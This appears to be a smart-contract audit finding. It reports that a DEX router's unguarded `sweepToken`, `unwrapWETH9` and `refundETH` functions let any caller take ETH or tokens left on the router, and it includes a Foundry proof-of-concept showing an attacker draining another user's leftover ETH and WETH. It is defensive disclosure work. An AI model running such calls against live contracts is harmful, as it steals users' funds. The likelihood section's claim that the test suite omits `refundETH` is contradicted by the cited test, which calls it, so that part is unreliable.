### Title
Any Caller Can Drain Router-Held ETH and ERC-20 Balances via Unguarded `sweepToken` / `refundETH` — (File: `metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`sweepToken`, `unwrapWETH9`, and `refundETH` in `PeripheryPayments.sol` carry no caller restriction. Any address can invoke them at any time to redirect the router's entire ETH or ERC-20 balance to an arbitrary recipient. Because the router legitimately holds user funds between multicall steps (intermediate-hop tokens, over-sent native ETH for WETH swaps), a griever or MEV bot can steal those balances the moment a multicall transaction lands.

---

### Finding Description

`sweepToken` and `unwrapWETH9` are declared `public payable` with no `onlyOwner`, `onlyCaller`, or equivalent guard. `refundETH` is `external payable` with the same absence of restriction. [1](#0-0) 

All three functions transfer the router's full balance of the requested asset to a caller-supplied address (or to `msg.sender` for `refundETH`).

The router is designed to hold assets transiently:

- `exactInput` routes intermediate tokens through `address(this)` between hops. [2](#0-1) 

- Native ETH sent with a multicall for a WETH swap is held on the router until the user explicitly calls `refundETH`. If a user omits that step, the ETH remains on the router after the transaction settles.

- WETH output from a swap directed to `address(router)` for unwrapping sits on the router until `unwrapWETH9` is called.

Any watcher can then call `sweepToken(token, 0, attacker)` or `refundETH()` in a follow-up transaction to drain those funds.

A second, compounding vector exists in the `pay` function's WETH branch, which consumes the router's native ETH balance **before** pulling from the payer: [3](#0-2) 

If the router holds leftover ETH from a previous user, the next WETH swap silently consumes it, giving the new user a discount at the previous user's expense — no explicit `sweepToken` call required.

---

### Impact Explanation

Direct loss of user principal. A user who sends excess ETH with a multicall and omits `refundETH` loses that ETH to the first caller who notices. Similarly, WETH output directed to the router for unwrapping can be swept by anyone to any `recipient`. The `pay` function's ETH-first logic compounds the issue by silently consuming leftover ETH during subsequent legitimate swaps, draining the stranded balance without the attacker needing to call any sweep function at all.

---

### Likelihood Explanation

Medium. SDK-generated or manually constructed multicall payloads can omit `refundETH` for WETH-input swaps (the test suite itself demonstrates this pattern as the expected user flow). [4](#0-3) 

MEV bots routinely monitor for unprotected sweep functions on router contracts. The attack requires no special permissions and is executable by any EOA.

---

### Recommendation

Restrict `sweepToken`, `unwrapWETH9`, and `refundETH` so they can only be invoked by the originating user. One approach: record `msg.sender` at the start of each top-level multicall entry and require that the same address calls any sweep/refund within the same transaction. Alternatively, track per-user deposited ETH and only allow recovery by the original depositor. At minimum, `sweepToken` should send only to `msg.sender`, not to an arbitrary `recipient`, mirroring the `refundETH` pattern.

---

### Proof of Concept

```solidity
// User A sends 2 ETH for a 1 ETH WETH swap, forgets refundETH
vm.deal(userA, 2 ether);
vm.prank(userA);
bytes[] memory calls = new bytes[](1); // missing refundETH call
calls[0] = abi.encodeWithSelector(
    router.exactInputSingle.selector,
    IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool:             address(pool),
        tokenIn:          address(weth),
        tokenOut:         address(token1),
        zeroForOne:       true,
        amountIn:         1 ether,
        amountOutMinimum: 0,
        recipient:        userA,
        deadline:         block.timestamp + 1,
        priceLimitX64:    0,
        extensionData:    ""
    })
);
router.multicall{value: 2 ether}(calls);
// 1 ETH remains on router — userA's funds

// Attacker steals it with a single permissionless call
uint256 attackerBefore = attacker.balance;
vm.prank(attacker);
router.refundETH();
assertEq(attacker.balance - attackerBefore, 1 ether); // userA's ETH stolen

// --- OR --- attacker steals via sweepToken (e.g. stranded WETH)
vm.prank(attacker);
router.sweepToken(address(weth), 0, attacker);
// attacker receives all WETH held by router
``` [5](#0-4) [6](#0-5)

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L37-63)
```text
  function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);

    if (balanceWETH > 0) {
      IWETH9(WETH).withdraw(balanceWETH);
      _transferETH(recipient, balanceWETH);
    }
  }

  /// @inheritdoc IPeripheryPayments
  function sweepToken(address token, uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceToken = IERC20(token).balanceOf(address(this));
    if (balanceToken < amountMinimum) revert InsufficientToken(token, amountMinimum, balanceToken);

    if (balanceToken > 0) {
      IERC20(token).safeTransfer(recipient, balanceToken);
    }
  }

  /// @inheritdoc IPeripheryPayments
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L69-88)
```text
  function pay(address token, address payer, address recipient, uint256 value) internal {
    // If the payer is contract it means we are in the middle of a path. In the middle of a path we operate on ERC20 only.
    if (payer == address(this)) {
      IERC20(token).safeTransfer(recipient, value);
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L103-106)
```text
      _setNextCallbackContext(pool, CALLBACK_MODE_JUST_PAY, i == 0 ? msg.sender : address(this), params.tokens[i]);
      (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(pool)
        .swap(
          i == last ? params.recipient : address(this),
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
